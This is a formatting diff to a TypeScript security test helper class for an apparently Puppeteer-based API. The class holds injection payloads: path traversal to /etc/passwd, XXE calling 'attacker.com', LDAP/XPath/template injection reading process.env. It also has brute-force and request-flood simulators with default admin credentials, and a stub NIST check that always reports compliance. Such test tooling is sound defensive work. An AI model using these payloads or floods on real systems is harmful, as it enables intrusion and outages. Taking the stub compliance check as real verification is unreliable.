@@ -39,21 +39,21 @@ export class SecurityTestHelpers {
    */
   static getXSSPayloads(): string[] {
     const payloads = JSON.parse(
-      readFileSync(join(this.FIXTURES_DIR, 'xss-payloads.json'), 'utf-8')
+      readFileSync(join(this.FIXTURES_DIR, 'xss-payloads.json'), 'utf-8'),
     );
     return payloads.vectors;
   }
 
   static getSQLPayloads(): string[] {
     const payloads = JSON.parse(
-      readFileSync(join(this.FIXTURES_DIR, 'sql-payloads.json'), 'utf-8')
+      readFileSync(join(this.FIXTURES_DIR, 'sql-payloads.json'), 'utf-8'),
     );
     return payloads.vectors;
   }
 
   static getCommandInjectionPayloads(): string[] {
     const payloads = JSON.parse(
-      readFileSync(join(this.FIXTURES_DIR, 'command-payloads.json'), 'utf-8')
+      readFileSync(join(this.FIXTURES_DIR, 'command-payloads.json'), 'utf-8'),
     );
     return payloads.vectors;
   }
@@ -75,7 +75,7 @@ export class SecurityTestHelpers {
       '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
       '..././..././..././..././..././..././..././..././etc/passwd',
       '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
-      'php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
+      'php://filter/read=convert.base64-encode/resource=../../../etc/passwd',
     ];
   }
 
@@ -89,14 +89,14 @@ export class SecurityTestHelpers {
       exp: Math.floor(Date.now() / 1000) + 3600,
       roles: ['user'],
       permissions: ['read'],
-      ...payload
+      ...payload,
     };
 
     return jwt.sign(defaultPayload, process.env.TEST_JWT_SECRET || 'test-secret', {
       algorithm: 'HS256',
       issuer: 'puppeteer-mcp-test',
       audience: 'puppeteer-mcp-api',
-      ...options
+      ...options,
     });
   }
 
@@ -115,7 +115,7 @@ export class SecurityTestHelpers {
     const token = this.generateTestJWT({
       sub: 'admin-user',
       roles: ['admin'],
-      permissions: ['*']
+      permissions: ['*'],
     });
 
     return this.createTestSession({ token, role: 'admin' });
@@ -125,7 +125,7 @@ export class SecurityTestHelpers {
     const token = this.generateTestJWT({
       sub: 'regular-user',
       roles: ['user'],
-      permissions: ['read', 'write']
+      permissions: ['read', 'write'],
     });
 
     return this.createTestSession({ token, role: 'user' });
@@ -135,7 +135,7 @@ export class SecurityTestHelpers {
     const token = this.generateTestJWT({
       sub: 'guest-user',
       roles: ['guest'],
-      permissions: ['read']
+      permissions: ['read'],
     });
 
     return this.createTestSession({ token, role: 'guest' });
@@ -151,12 +151,12 @@ export class SecurityTestHelpers {
   static async simulateBruteForce(
     endpoint: string,
     attempts: number = 100,
-    credentials: Array<{ username: string; password: string }> = []
+    credentials: Array<{ username: string; password: string }> = [],
   ): Promise<{ successful: number; blocked: number; responses: TestResponse[] }> {
     const results = {
       successful: 0,
       blocked: 0,
-      responses: [] as TestResponse[]
+      responses: [] as TestResponse[],
     };
 
     const defaultCredentials = [
@@ -164,7 +164,7 @@ export class SecurityTestHelpers {
       { username: 'admin', password: 'password' },
       { username: 'admin', password: '123456' },
       { username: 'root', password: 'root' },
-      { username: 'test', password: 'test' }
+      { username: 'test', password: 'test' },
     ];
 
     const testCredentials = credentials.length > 0 ? credentials : defaultCredentials;
@@ -173,7 +173,7 @@ export class SecurityTestHelpers {
       const cred = testCredentials[i % testCredentials.length];
       const response = await this.makeRequest(endpoint, {
         method: 'POST',
-        body: cred
+        body: cred,
       });
 
       results.responses.push(response);
@@ -191,13 +191,13 @@ export class SecurityTestHelpers {
   static async simulateDDoS(
     target: string,
     duration: number = 5000,
-    requestsPerSecond: number = 1000
+    requestsPerSecond: number = 1000,
   ): Promise<{ totalRequests: number; successful: number; failed: number; availability: number }> {
     const results = {
       totalRequests: 0,
       successful: 0,
       failed: 0,
-      availability: 0
+      availability: 0,
     };
 
     const startTime = Date.now();
@@ -208,11 +208,11 @@ export class SecurityTestHelpers {
         requests.push(
           this.makeRequest(target, { method: 'GET' })
             .then(() => results.successful++)
-            .catch(() => results.failed++)
+            .catch(() => results.failed++),
         );
         results.totalRequests++;
       }
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise((resolve) => setTimeout(resolve, 100));
     }
 
     await Promise.all(requests);
@@ -235,13 +235,13 @@ export class SecurityTestHelpers {
 
   static containsPII(text: string): boolean {
     const piiPatterns = [
-      /\b\d{3}-\d{2}-\d{4}\b/,                    // SSN
+      /\b\d{3}-\d{2}-\d{4}\b/, // SSN
       /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/, // Credit Card
       /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/, // Email
-      /\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/ // Phone
+      /\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/, // Phone
     ];
 
-    return piiPatterns.some(pattern => pattern.test(text));
+    return piiPatterns.some((pattern) => pattern.test(text));
   }
 
   static isSecurePassword(password: string): boolean {
@@ -251,16 +251,24 @@ export class SecurityTestHelpers {
       hasLowercase: /[a-z]/.test(password),
       hasNumbers: /\d/.test(password),
       hasSpecial: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password),
-      notCommon: !this.isCommonPassword(password)
+      notCommon: !this.isCommonPassword(password),
     };
 
-    return Object.values(requirements).every(req => req === true);
+    return Object.values(requirements).every((req) => req === true);
   }
 
   private static isCommonPassword(password: string): boolean {
     const commonPasswords = [
-      'password', '123456', 'password123', 'admin', 'letmein',
-      'welcome', 'monkey', '1234567890', 'qwerty', 'abc123'
+      'password',
+      '123456',
+      'password123',
+      'admin',
+      'letmein',
+      'welcome',
+      'monkey',
+      '1234567890',
+      'qwerty',
+      'abc123',
     ];
     return commonPasswords.includes(password.toLowerCase());
   }
@@ -270,7 +278,7 @@ export class SecurityTestHelpers {
    */
   static async measureTimingVariance(
     operation: () => Promise<any>,
-    iterations: number = 1000
+    iterations: number = 1000,
   ): Promise<{ mean: number; variance: number; isConstantTime: boolean }> {
     const timings: number[] = [];
 
@@ -282,14 +290,15 @@ export class SecurityTestHelpers {
     }
 
     const mean = timings.reduce((a, b) => a + b) / timings.length;
-    const variance = timings.reduce((sum, time) => sum + Math.pow(time - mean, 2), 0) / timings.length;
+    const variance =
+      timings.reduce((sum, time) => sum + Math.pow(time - mean, 2), 0) / timings.length;
     const stdDev = Math.sqrt(variance);
     const coefficientOfVariation = stdDev / mean;
 
     return {
       mean,
       variance,
-      isConstantTime: coefficientOfVariation < 0.1 // Less than 10% variation
+      isConstantTime: coefficientOfVariation < 0.1, // Less than 10% variation
     };
   }
 
@@ -298,7 +307,7 @@ export class SecurityTestHelpers {
    */
   private static async createTestSession(options: any): Promise<TestSession> {
     const sessionId = randomBytes(16).toString('hex');
-    
+
     return {
       id: sessionId,
       token: options.token,
@@ -309,28 +318,31 @@ export class SecurityTestHelpers {
           ...reqOptions,
           headers: {
             ...reqOptions?.headers,
-            'Authorization': options.token ? `Bearer ${options.token}` : undefined,
+            Authorization: options.token ? `Bearer ${options.token}` : undefined,
             'X-API-Key': options.apiKey,
-            'Cookie': options.cookies?.join('; ')
-          }
+            Cookie: options.cookies?.join('; '),
+          },
         });
       },
       cleanup: async () => {
         // Cleanup logic here
-      }
+      },
     };
   }
 
   /**
    * Make HTTP request (stub - should be implemented with actual HTTP client)
    */
-  private static async makeRequest(path: string, options: RequestOptions = {}): Promise<TestResponse> {
+  private static async makeRequest(
+    path: string,
+    options: RequestOptions = {},
+  ): Promise<TestResponse> {
     // This should be implemented with actual HTTP client (supertest, axios, etc.)
     // For now, return a stub response
     return {
       status: 200,
       body: {},
-      headers: {}
+      headers: {},
     };
   }
 
@@ -357,12 +369,7 @@ export class SecurityTestHelpers {
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
         '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]><foo/>',
       ],
-      ldap: [
-        '*)(uid=*',
-        '*)(|(uid=*',
-        'admin)(&(password=*)',
-        'admin))(|(password=*',
-      ],
+      ldap: ['*)(uid=*', '*)(|(uid=*', 'admin)(&(password=*)', 'admin))(|(password=*'],
       xpath: [
         "' or '1'='1",
         "'] | //user[password='",
@@ -374,7 +381,7 @@ export class SecurityTestHelpers {
         '<%= 7*7 %>',
         '{{config.items()}}',
         '{{constructor.constructor("return process.env")()}}',
-      ]
+      ],
     };
   }
 
@@ -383,12 +390,12 @@ export class SecurityTestHelpers {
    */
   static async verifyNISTControl(
     control: string,
-    evidence: any[]
+    evidence: any[],
   ): Promise<{ compliant: boolean; gaps: string[] }> {
     // Implement NIST control verification logic
     return {
       compliant: true,
-      gaps: []
+      gaps: [],
     };
   }
 
@@ -403,10 +410,10 @@ export class SecurityTestHelpers {
         totalControls: 0,
         implemented: 0,
         partial: 0,
-        notImplemented: 0
+        notImplemented: 0,
       },
       controls: [],
-      recommendations: []
+      recommendations: [],
     };
   }
 }
